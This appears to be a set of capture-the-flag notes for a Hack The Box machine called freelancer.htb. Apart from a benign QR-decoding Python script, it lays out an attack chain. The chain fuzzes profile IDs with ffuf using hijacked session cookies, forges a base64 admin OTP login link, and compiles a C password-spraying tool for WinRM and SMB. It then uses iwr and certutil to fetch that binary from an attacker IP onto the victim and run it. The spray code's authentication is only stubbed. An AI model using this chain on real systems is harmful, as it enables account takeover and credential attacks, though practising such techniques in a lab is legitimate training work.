==========(1)======================================================================================================================
#Sample Python script to read a QR code image and extract the URL from it using the qrcode library and Pillow for image handling:

from PIL import Image
import qrcode
import cv2
import numpy as np

def decode_qr_code(image_path):
    """
    Decodes a QR code from the given image file.

    :param image_path: Path to the QR code image
    :return: Decoded data or an error message
    """
    # Load the image using OpenCV
    image = cv2.imread(image_path)
    
    # Initialize the QRCodeDetector
    detector = cv2.QRCodeDetector()
    
    # Detect and decode the QR code
    data, vertices, _ = detector.detectAndDecode(image)
    
    if vertices is not None:
        return data
    else:
        return "No QR code detected in the image."

# Test the function
if __name__ == "__main__":
    # Specify the path to your QR code image
    qr_image_path = "path_to_qr_code_image.png"
    
    # Decode the QR code
    result = decode_qr_code(qr_image_path)
    
    # Print the extracted data
    print("Decoded QR Code Data:", result)

How It Works:
Pillow (PIL): Used for handling images if needed for further manipulation.
OpenCV: The QRCodeDetector is used to detect and decode QR codes from the image.
Input: Provide the path to your QR code image.
Output: The URL or data contained in the QR code.
Requirements
Install the necessary libraries:
pip install opencv-python-headless Pillow

Usage
Replace path_to_qr_code_image.png with the actual path to your QR code image and run the script. If the image contains a QR code with a URL, it will print the extracted URL.
==========(2)======================================================================================================================
#Linux command to generate numbers from 1 to 65535 and redirect them to a file
seq 1 65535 > numbers.txt
==========(3)======================================================================================================================
#Use BurpSuite to find sessionid and csrftoken and then use it for FUZZ
ffuf -u 'http://freelancer.htb/accounts/profile/visit/FUZZ/' -X GET -H 'Cookie: sessionid=4p6yyd6c1zosaiuqzfvm3xuu9nr8k08g;csrftoken=uClh0dyORb2wtB2zqDYdxc6YZuGftsE5' -w /home/mabali/numbers.txt -v
==========(4)======================================================================================================================
#find the admin page and convert page number to base64
printf "%d" 2 | base64
==========(5)======================================================================================================================
#use scanqr code to get link content
echo "http://freelancer.htb/accounts/login/otp/Mg==/43c1fd8315d35368f280e7298fdab3a8/"
==========(6)======================================================================================================================
#Install mingw
#sudo apt-get update
#sudo apt-get install mingw-w64

#C program to spray known password against all accounts

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

// Function prototypes
void spray_winrm(const char *target, const char *usernames_file, const char *passwords_file);
void spray_smb(const char *target, const char *usernames_file, const char *passwords_file);

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <service> <target> <usernames_file> <passwords_file>\n", argv[0]);
        printf("Example: %s winrm freelancer.htb usernames.list passwords.list\n", argv[0]);
        return 1;
    }

    const char *service = argv[1];
    const char *target = argv[2];
    const char *usernames_file = argv[3];
    const char *passwords_file = argv[4];

    if (strcmp(service, "winrm") == 0) {
        spray_winrm(target, usernames_file, passwords_file);
    } else if (strcmp(service, "smb") == 0) {
        spray_smb(target, usernames_file, passwords_file);
    } else {
        printf("Unsupported service: %s. Supported services are winrm and smb.\n", service);
    }

    return 0;
}

void spray_winrm(const char *target, const char *usernames_file, const char *passwords_file) {
    printf("[*] Starting WinRM password spray against %s...\n", target);
    FILE *ufile = fopen(usernames_file, "r");
    FILE *pfile = fopen(passwords_file, "r");

    if (!ufile || !pfile) {
        printf("Error opening files.\n");
        return;
    }

    char username[256];
    char password[256];
    while (fgets(username, sizeof(username), ufile)) {
        // Remove newline character
        username[strcspn(username, "\n")] = '\0';
        rewind(pfile);

        while (fgets(password, sizeof(password), pfile)) {
            password[strcspn(password, "\n")] = '\0';
            printf("Trying WinRM: %s:%s\n", username, password);
            // Add WinRM-specific authentication code here
        }
    }

    fclose(ufile);
    fclose(pfile);
}

void spray_smb(const char *target, const char *usernames_file, const char *passwords_file) {
    printf("[*] Starting SMB password spray against %s...\n", target);
    FILE *ufile = fopen(usernames_file, "r");
    FILE *pfile = fopen(passwords_file, "r");

    if (!ufile || !pfile) {
        printf("Error opening files.\n");
        return;
    }

    char username[256];
    char password[256];
    while (fgets(username, sizeof(username), ufile)) {
        // Remove newline character
        username[strcspn(username, "\n")] = '\0';
        rewind(pfile);

        while (fgets(password, sizeof(password), pfile)) {
            password[strcspn(password, "\n")] = '\0';
            printf("Trying SMB: %s:%s\n", username, password);
            // Add SMB-specific authentication code here
        }
    }

    fclose(ufile);
    fclose(pfile);
}

#compile
x86_64-w64-mingw32-gcc -o spray.exe spray.c -lws2_32

#fetch spray.exe onto victim machine using python3 http.server using either of the two methods.
(a) iwr http://10.10.14.43:8000/spray.exe -OutFile spray.exe
(b) certutil -urlcache -split -f http://10.10.14.43:8000/spray.exe spray.exe

#execute
./spray.exe winrm freelancer.htb usernames.list passwords.list
./spray.exe smb freelancer.htb usernames.list passwords.list
